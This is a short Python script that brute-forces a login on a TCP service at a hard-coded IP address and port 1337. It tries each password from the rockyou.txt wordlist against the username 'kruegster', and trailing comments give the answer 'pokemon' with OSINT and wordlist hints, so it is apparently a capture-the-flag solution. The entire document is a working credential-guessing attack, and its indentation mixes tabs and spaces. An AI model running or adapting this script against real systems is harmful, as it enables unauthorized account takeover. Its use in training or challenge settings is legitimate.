
import socket

host = "142.93.117.193"
port = 1337
wordlist = "rockyou.txt"

def brute_force():

    file = open(wordlist,"r")
    username = "kruegster" 


    for password in file:

        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect( (host,port) )

	print("Bruteforce Username:"+username+"\t Password:"+ password)
        data = s.recv(1024)

        s.send(username +"\n")
        data = s.recv(1024)

        s.send(password +"\n")
        result = s.recv(1024)
	print("Result:"+result);

        if result != "Fail\n":
            print("Password Found:"+password)
            break



if __name__ == '__main__':
	print("Starting Bruteforce Attack: "+host+" Port:"+str(port)+"\n")
	brute_force()

#username = "kruegster"   # Hint: use OSINT
#password = "pokemon" # Hint: use wordlist
